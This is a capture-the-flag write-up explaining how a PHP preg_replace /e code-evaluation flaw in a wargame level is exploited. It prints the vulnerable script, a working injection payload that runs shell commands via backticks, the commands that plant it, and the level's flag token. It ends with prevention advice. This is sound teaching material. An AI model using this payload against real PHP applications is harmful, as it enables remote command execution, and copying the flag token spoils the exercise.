# Level 06 - PHP preg_replace /e Code Execution

## 🎯 Objective
Exploit a PHP regex vulnerability to execute commands as `flag06`.

## 🧠 My Thought Process

### Step 1: "Analyzing the PHP script"
```bash
cat level06.php
```

```php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}

function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  // ← VULNERABLE!
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}

$r = x($argv[1], $argv[2]); 
print $r;
?>
```

### Step 2: "Spotting the dangerous /e modifier"
The critical line:
```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

**The `/e` modifier is DANGEROUS!** It evaluates the replacement string as PHP code.

This was deprecated in PHP 5.5 and removed in PHP 7.0 because it's inherently insecure.

### Step 3: "Understanding the regex"
Pattern: `/(\[x (.*)\])/e`

This matches strings like:
- `[x hello]` → Captures "hello" in group 2
- `[x anything here]` → Captures "anything here"

The replacement `y("\\2")` calls function `y()` with the captured text.

### Step 4: "How can I inject code?"
With `/e`, the replacement is **evaluated as PHP**. If I can control what goes into `\\2`, I can inject PHP code!

The trick is using PHP's variable interpolation in double-quoted strings:

```php
// In double quotes, ${} is evaluated
"y(\"${system(whoami)}\")"  // Would execute system("whoami")
```

But simpler - **backticks execute shell commands in PHP**:
```php
`command`  // Same as shell_exec("command")
```

### Step 5: "Crafting the payload"
I need to create a file containing:
```
[x ${`getflag`}]
```

When the regex matches this:
1. Captures `${`getflag`}` as group 2
2. Creates replacement: `y("${`getflag`}")`
3. PHP evaluates this string
4. `${`getflag`}` executes the getflag command!

```bash
# Create exploit file (using heredoc to preserve special chars)
cat > /tmp/exploit06 << "EOF"
[x ${`getflag`}]
EOF

# Run the vulnerable script
./level06 /tmp/exploit06
```

## ✅ Solution
```bash
cat > /tmp/exploit06 << "EOF"
[x ${`getflag`}]
EOF

./level06 /tmp/exploit06
```

**Token:** `wiok45aaoguiboiki2tuin6ub`

## 📚 Concepts to Learn

### 1. The Dangerous /e Modifier
In older PHP, `preg_replace()` with `/e` evaluated the replacement as code:

```php
// DANGEROUS - /e evaluates replacement as PHP code
preg_replace('/pattern/e', 'code_here', $input);

// SAFE - use preg_replace_callback instead
preg_replace_callback('/pattern/', function($m) {
    return process($m[1]);
}, $input);
```

### 2. PHP String Interpolation
In double-quoted strings, PHP expands variables and expressions:

```php
$name = "world";
echo "Hello $name";      // Hello world
echo "Hello {$name}";    // Hello world
echo "Hello ${name}";    // Hello world

// Complex expressions
echo "{${phpinfo()}}";   // Calls phpinfo()!
```

### 3. PHP Backtick Operator
Backticks execute shell commands:

```php
$output = `ls -la`;      // Runs shell command
$output = shell_exec('ls -la');  // Equivalent
```

### 4. The Complete Attack Chain
```
1. Create file with: [x ${`getflag`}]
   ↓
2. Script reads file
   ↓
3. preg_replace matches [x ...]
   ↓
4. Replacement becomes: y("${`getflag`}")
   ↓
5. /e modifier evaluates this as PHP
   ↓
6. PHP runs: getflag
   ↓
7. Token captured!
```

### 5. Why /e Was Removed
| PHP Version | Status |
|-------------|--------|
| < 5.5 | Works normally |
| 5.5 - 6.x | Deprecated (E_DEPRECATED warning) |
| 7.0+ | REMOVED (fatal error) |

The `/e` modifier was simply too dangerous to keep.

## 🔧 Tools Used
- `cat` - Read and create files
- `heredoc` - Create files with special characters
- Understanding of PHP internals

## 🛡️ How to Prevent This
1. **Never use the /e modifier** - Use `preg_replace_callback()` instead:
   ```php
   // Instead of:
   preg_replace('/pattern/e', 'func("$1")', $str);
   
   // Use:
   preg_replace_callback('/pattern/', function($m) {
       return func($m[1]);
   }, $str);
   ```

2. **Update PHP** to version 7+ where /e doesn't exist

3. **Code review** for regex patterns - Check for /e modifier

4. **Static analysis tools** can detect this vulnerability

5. **Principle of least privilege** - PHP shouldn't run as privileged user
